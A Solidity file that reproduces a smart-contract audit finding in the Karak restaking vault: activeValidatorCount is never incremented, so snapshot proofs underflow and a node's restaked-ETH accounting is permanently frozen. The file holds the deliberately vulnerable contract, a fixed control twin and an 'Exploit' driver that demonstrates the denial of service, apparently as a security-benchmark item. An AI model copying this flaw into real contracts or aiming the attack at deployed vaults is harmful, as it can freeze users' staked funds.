// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Karak finding 38491 (H-03):
// "`activeValidatorCount` is never set or increased".
//
// Real audited source: Pashov Audit Group, Karak security review (June 2025).
//   report github.com/pashov/audits/blob/master/team/md/Karak-security-review-June.md
// Brief src=embedded (no repo on disk) → the finding's embedded snippets ARE the
// verbatim audited source. Each is reproduced byte-for-byte below:
//   NativeVaultLib.sol  validateWithdrawalCredentials  (missing increment = @> VULN)
//   NativeVaultLib.sol  validateSnapshotProof          (the lone activeValidatorCount--)
//   NativeVault.sol     _startSnapshot                 (remainingProofs: node.activeValidatorCount)
//   NativeVault.sol     validateSnapshotProofs         (snapshot.remainingProofs--)
//   NativeVault.sol     _updateSnapshot                (if remainingProofs == 0 → credit)
//
// Root cause: NativeVaultLib.validateWithdrawalCredentials registers a validator
// (status ACTIVE, restakedBalanceWei set) but NEVER increments
// `ownerToNode[nodeOwner].activeValidatorCount` (the single line the report's fix
// adds). The counter is only ever DEcremented — in validateSnapshotProof, when a
// validator's beacon balance hits 0. Because it starts and stays at 0,
// _startSnapshot builds a Snapshot with `remainingProofs = 0`, and the VERBATIM
// `snapshot.remainingProofs--;` in validateSnapshotProofs underflows on the very
// first submitted proof (Solidity 0.8 checked arithmetic → Panic 0x11 revert).
// A node that has registered validators can therefore NEVER complete a balance
// snapshot: its restaked-ETH accounting is permanently bricked (DoS).
//
// Non-vulnerable dependencies (beacon-proof verification, the node's consensus
// balance, _updateBalance) are faithful minimal doubles. A `*Fixed` twin
// (byte-identical plus the single recommended `activeValidatorCount++`) is
// included as a control to prove the revert is caused precisely by the missing
// increment.
// ─────────────────────────────────────────────────────────────────────────────

library NativeVaultLib {
    enum ValidatorStatus {
        INACTIVE,
        ACTIVE,
        WITHDRAWN
    }

    struct ValidatorProof {
        uint64 validatorIndex;
    }

    struct ValidatorFieldsProof {
        ValidatorProof validatorProof;
    }

    struct ValidatorDetails {
        ValidatorStatus status;
        uint64 validatorIndex;
        uint64 lastBalanceUpdateTimestamp;
        uint256 restakedBalanceWei;
    }

    struct Snapshot {
        bytes32 parentBeaconBlockRoot;
        uint256 nodeBalanceWei;
        int256 balanceDeltaWei;
        uint256 remainingProofs;
    }

    struct NativeNode {
        address nodeAddress;
        uint256 activeValidatorCount;
        uint256 creditedNodeETH;
        uint64 currentSnapshotTimestamp;
        uint64 lastSnapshotTimestamp;
        Snapshot currentSnapshot;
        mapping(bytes32 => ValidatorDetails) validatorPubkeyHashToDetails;
    }

    struct Storage {
        mapping(address => NativeNode) ownerToNode;
    }

    event ValidatorWithdrawn(
        address indexed nodeOwner, address indexed nodeAddress, uint64 timestamp, uint64 validatorIndex
    );

    /// @notice VERBATIM tail of NativeVaultLib.validateWithdrawalCredentials. The
    ///         report's fix adds one line — `activeValidatorCount++` — right after
    ///         the marked storage write. Its ABSENCE is the bug.
    function validateWithdrawalCredentials(
        Storage storage self,
        address nodeOwner,
        bytes32 validatorPubkeyHash,
        uint64 updateTimestamp,
        uint256 restakedBalanceWei,
        ValidatorFieldsProof memory validatorFieldsProof
    ) internal {
        ValidatorDetails memory validatorDetails =
            self.ownerToNode[nodeOwner].validatorPubkeyHashToDetails[validatorPubkeyHash];

        validatorDetails.status = NativeVaultLib.ValidatorStatus.ACTIVE;
        validatorDetails.validatorIndex = validatorFieldsProof.validatorProof.validatorIndex;
        validatorDetails.lastBalanceUpdateTimestamp = updateTimestamp;
        validatorDetails.restakedBalanceWei = restakedBalanceWei;
        self.ownerToNode[nodeOwner].validatorPubkeyHashToDetails[validatorPubkeyHash] = validatorDetails; // @> VULN: activeValidatorCount is never set/incremented here — missing `self.ownerToNode[nodeOwner].activeValidatorCount++;`
    }

    /// @notice Control twin: byte-identical to the above plus the ONE recommended fix line.
    function validateWithdrawalCredentialsFixed(
        Storage storage self,
        address nodeOwner,
        bytes32 validatorPubkeyHash,
        uint64 updateTimestamp,
        uint256 restakedBalanceWei,
        ValidatorFieldsProof memory validatorFieldsProof
    ) internal {
        ValidatorDetails memory validatorDetails =
            self.ownerToNode[nodeOwner].validatorPubkeyHashToDetails[validatorPubkeyHash];

        validatorDetails.status = NativeVaultLib.ValidatorStatus.ACTIVE;
        validatorDetails.validatorIndex = validatorFieldsProof.validatorProof.validatorIndex;
        validatorDetails.lastBalanceUpdateTimestamp = updateTimestamp;
        validatorDetails.restakedBalanceWei = restakedBalanceWei;
        self.ownerToNode[nodeOwner].validatorPubkeyHashToDetails[validatorPubkeyHash] = validatorDetails;
        self.ownerToNode[nodeOwner].activeValidatorCount++; // the fix the report recommends
    }

    /// @notice Faithful double of one balance-proof verification. The VERBATIM
    ///         zero-balance branch below is the ONLY place activeValidatorCount is
    ///         ever written — and it only DEcrements.
    function validateSnapshotProof(
        Storage storage self,
        address nodeOwner,
        address nodeAddress,
        uint64 timestamp,
        bytes32 validatorPubkeyHash,
        uint256 newBalanceWei
    ) internal returns (int256 balanceDeltaWei) {
        ValidatorDetails memory validatorDetails =
            self.ownerToNode[nodeOwner].validatorPubkeyHashToDetails[validatorPubkeyHash];
        uint64 validatorIndex = validatorDetails.validatorIndex;

        balanceDeltaWei = int256(newBalanceWei) - int256(validatorDetails.restakedBalanceWei);
        validatorDetails.restakedBalanceWei = newBalanceWei;
        validatorDetails.lastBalanceUpdateTimestamp = timestamp;

        if (newBalanceWei == 0) {
            self.ownerToNode[nodeOwner].activeValidatorCount--;
            validatorDetails.status = ValidatorStatus.WITHDRAWN;

            emit ValidatorWithdrawn(nodeOwner, nodeAddress, timestamp, validatorIndex);
        }

        self.ownerToNode[nodeOwner].validatorPubkeyHashToDetails[validatorPubkeyHash] = validatorDetails;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the snapshot machinery (_startSnapshot / validateSnapshotProofs
// / _updateSnapshot) is reproduced VERBATIM from the audited NativeVault. It inlines
// NativeVaultLib above, whose validateWithdrawalCredentials omits the increment.
// ─────────────────────────────────────────────────────────────────────────────
contract NativeVault {
    using NativeVaultLib for NativeVaultLib.Storage;

    NativeVaultLib.Storage internal self;

    // Faithful double for the node's beacon-chain (consensus) balance, i.e. the real
    // code's `node.nodeAddress.balance`. Grows as validators point credentials here.
    mapping(address => uint256) public nodeConsensusBalanceWei;

    struct BalanceProof {
        bytes32 validatorPubkeyHash;
        uint256 newBalanceWei;
    }

    event SnapshotCreated(address indexed nodeOwner, address indexed nodeAddress, bytes32 parentBeaconBlockRoot);
    event SnapshotFinished(address indexed nodeOwner, address indexed nodeAddress, uint64 timestamp, int256 totalDeltaWei);

    function registerNode(address nodeOwner, address nodeAddress) external {
        self.ownerToNode[nodeOwner].nodeAddress = nodeAddress;
    }

    // ── faithful doubles for the non-vulnerable helpers ──
    function _updateBalance(address, int256) internal {}

    function _getParentBlockRoot(uint64 ts) internal pure returns (bytes32) {
        return bytes32(uint256(ts));
    }

    /// @notice Entry point registering a validator's withdrawal credentials —
    ///         delegates to the VERBATIM (buggy) library function.
    function validateWithdrawalCredentials(
        address nodeOwner,
        bytes32 validatorPubkeyHash,
        uint64 updateTimestamp,
        uint256 restakedBalanceWei,
        NativeVaultLib.ValidatorFieldsProof calldata validatorFieldsProof
    ) external {
        self.validateWithdrawalCredentials(
            nodeOwner, validatorPubkeyHash, updateTimestamp, restakedBalanceWei, validatorFieldsProof
        );
        // double: the validator's restaked ETH now backs the node's consensus balance
        nodeConsensusBalanceWei[nodeOwner] += restakedBalanceWei;
    }

    /// @notice Control entry point using the fixed library twin.
    function validateWithdrawalCredentialsFixed(
        address nodeOwner,
        bytes32 validatorPubkeyHash,
        uint64 updateTimestamp,
        uint256 restakedBalanceWei,
        NativeVaultLib.ValidatorFieldsProof calldata validatorFieldsProof
    ) external {
        self.validateWithdrawalCredentialsFixed(
            nodeOwner, validatorPubkeyHash, updateTimestamp, restakedBalanceWei, validatorFieldsProof
        );
        nodeConsensusBalanceWei[nodeOwner] += restakedBalanceWei;
    }

    /// @notice VERBATIM _startSnapshot Snapshot construction. `remainingProofs` is
    ///         seeded from `node.activeValidatorCount` — which the bug leaves 0.
    function startSnapshot(address nodeOwner) external {
        NativeVaultLib.NativeNode storage node = self.ownerToNode[nodeOwner];
        require(node.currentSnapshotTimestamp == 0, "snapshot in progress");

        uint256 nodeBalanceWei = nodeConsensusBalanceWei[nodeOwner];

        NativeVaultLib.Snapshot memory snapshot = NativeVaultLib.Snapshot({
            parentBeaconBlockRoot: _getParentBlockRoot(uint64(block.timestamp)),
            nodeBalanceWei: nodeBalanceWei,
            balanceDeltaWei: 0,
            remainingProofs: node.activeValidatorCount
        });

        node.currentSnapshotTimestamp = uint64(block.timestamp);
        node.currentSnapshot = snapshot;
        emit SnapshotCreated(nodeOwner, node.nodeAddress, snapshot.parentBeaconBlockRoot);
    }

    /// @notice VERBATIM validateSnapshotProofs loop body. `snapshot.remainingProofs--`
    ///         underflows on the first proof because remainingProofs was seeded 0.
    function validateSnapshotProofs(address nodeOwner, BalanceProof[] calldata balanceProofs) external {
        NativeVaultLib.NativeNode storage node = self.ownerToNode[nodeOwner];
        require(node.currentSnapshotTimestamp != 0, "no snapshot in progress");
        NativeVaultLib.Snapshot memory snapshot = node.currentSnapshot;

        for (uint256 i = 0; i < balanceProofs.length; i++) {
            int256 balanceDeltaWei = self.validateSnapshotProof(
                nodeOwner,
                node.nodeAddress,
                uint64(block.timestamp),
                balanceProofs[i].validatorPubkeyHash,
                balanceProofs[i].newBalanceWei
            );
            snapshot.remainingProofs--;
            snapshot.balanceDeltaWei += balanceDeltaWei;
        }

        _updateSnapshot(node, snapshot, nodeOwner);
    }

    /// @notice VERBATIM _updateSnapshot finalization.
    function _updateSnapshot(
        NativeVaultLib.NativeNode storage node,
        NativeVaultLib.Snapshot memory snapshot,
        address nodeOwner
    ) internal {
        if (snapshot.remainingProofs == 0) {
            int256 totalDeltaWei = int256(snapshot.nodeBalanceWei) + snapshot.balanceDeltaWei;

            node.creditedNodeETH += snapshot.nodeBalanceWei;

            node.lastSnapshotTimestamp = node.currentSnapshotTimestamp;
            delete node.currentSnapshotTimestamp;
            delete node.currentSnapshot;

            _updateBalance(nodeOwner, totalDeltaWei);
            emit SnapshotFinished(nodeOwner, node.nodeAddress, node.lastSnapshotTimestamp, totalDeltaWei);
        } else {
            node.currentSnapshot = snapshot;
        }
    }

    // ── views ──
    function activeValidatorCount(address nodeOwner) external view returns (uint256) {
        return self.ownerToNode[nodeOwner].activeValidatorCount;
    }

    function creditedNodeETH(address nodeOwner) external view returns (uint256) {
        return self.ownerToNode[nodeOwner].creditedNodeETH;
    }

    function currentSnapshotTimestamp(address nodeOwner) external view returns (uint64) {
        return self.ownerToNode[nodeOwner].currentSnapshotTimestamp;
    }
}

/// @dev Marker token for the silent DoS harm (no attacker profit): the frozen
///      restaked-ETH magnitude is minted to SINK as the quantified loss.
contract MarkerToken {
    string public name = "Karak Restaked ETH (frozen)";
    string public symbol = "KARAK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a node registers a validator (32 ETH) through the buggy
// credential path, so activeValidatorCount stays 0; startSnapshot seeds
// remainingProofs = 0; and the first validateSnapshotProofs reverts with an
// arithmetic underflow (Panic 0x11) — the node can never finalize a snapshot.
// A control node using the fixed path completes its snapshot, proving the revert
// is caused precisely by the missing increment.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MarkerToken public marker; // child nonce 1
    NativeVault public vault; // child nonce 2 (VULN)

    uint256 internal constant STAKE = 32 ether; // one validator's restaked balance

    address public victimOwner;
    address public victimNode;
    address public controlOwner;
    address public controlNode;

    uint256 public victimActiveCount; // == 0 under the bug
    uint256 public controlActiveCount; // == 1 with the fix
    bool public dosConfirmed; // buggy node's snapshot proof reverted with underflow
    bool public controlSucceeded; // fixed node's snapshot proof completed
    uint256 public frozenWei; // restaked ETH the victim can never finalize
    uint256 public sinkHarm; // marker minted to SINK

    constructor() {
        marker = new MarkerToken(); // nonce 1
        vault = new NativeVault(); // nonce 2 (VULN)
    }

    function run() external {
        victimOwner = address(uint160(uint256(keccak256("karak.victim.owner"))));
        victimNode = address(uint160(uint256(keccak256("karak.victim.node"))));
        controlOwner = address(uint160(uint256(keccak256("karak.control.owner"))));
        controlNode = address(uint160(uint256(keccak256("karak.control.node"))));

        vault.registerNode(victimOwner, victimNode);
        vault.registerNode(controlOwner, controlNode);

        NativeVaultLib.ValidatorFieldsProof memory p = NativeVaultLib.ValidatorFieldsProof({
            validatorProof: NativeVaultLib.ValidatorProof({validatorIndex: 777})
        });

        // ── victim: buggy registration path — activeValidatorCount NOT incremented ──
        bytes32 pk = keccak256("validator.pubkey.victim");
        vault.validateWithdrawalCredentials(victimOwner, pk, uint64(block.timestamp), STAKE, p);
        victimActiveCount = vault.activeValidatorCount(victimOwner); // == 0 (the bug)

        vault.startSnapshot(victimOwner); // remainingProofs seeded to activeValidatorCount == 0

        NativeVault.BalanceProof[] memory proofs = new NativeVault.BalanceProof[](1);
        proofs[0] = NativeVault.BalanceProof({validatorPubkeyHash: pk, newBalanceWei: STAKE}); // still 32 ETH, active

        try vault.validateSnapshotProofs(victimOwner, proofs) {
            dosConfirmed = false;
        } catch Panic(uint256 code) {
            dosConfirmed = (code == 0x11); // 0x11 = arithmetic under/overflow: snapshot.remainingProofs--
        } catch {
            dosConfirmed = false;
        }

        // ── control: fixed registration path proves the revert is the missing ++ ──
        bytes32 pk2 = keccak256("validator.pubkey.control");
        vault.validateWithdrawalCredentialsFixed(controlOwner, pk2, uint64(block.timestamp), STAKE, p);
        controlActiveCount = vault.activeValidatorCount(controlOwner); // == 1

        vault.startSnapshot(controlOwner); // remainingProofs seeded to 1
        NativeVault.BalanceProof[] memory proofs2 = new NativeVault.BalanceProof[](1);
        proofs2[0] = NativeVault.BalanceProof({validatorPubkeyHash: pk2, newBalanceWei: STAKE});
        try vault.validateSnapshotProofs(controlOwner, proofs2) {
            controlSucceeded = true; // completes: remainingProofs 1 -> 0 -> finalize
        } catch {
            controlSucceeded = false;
        }

        // harm: the victim node has 32 ETH restaked that can NEVER be finalized via a
        // snapshot (every validateSnapshotProofs reverts, and it is stuck mid-snapshot).
        // Record the frozen magnitude at the SINK marker (silent DoS, no attacker payout).
        frozenWei = vault.nodeConsensusBalanceWei(victimOwner);
        marker.mint(SINK, frozenWei);
        sinkHarm = marker.balanceOf(SINK);

        require(victimActiveCount == 0, "precondition: activeValidatorCount must stay 0");
        require(dosConfirmed, "expected snapshot proof to revert (remainingProofs underflow DoS)");
        require(controlActiveCount == 1, "control: fixed path must count the validator");
        require(controlSucceeded, "control: fixed path snapshot must complete");
        require(vault.creditedNodeETH(victimOwner) == 0, "victim node is never credited (bricked)");
        require(frozenWei == STAKE, "frozen magnitude must equal the restaked stake");
        require(sinkHarm == STAKE, "harm marker must equal frozen restaked ETH");
    }
}
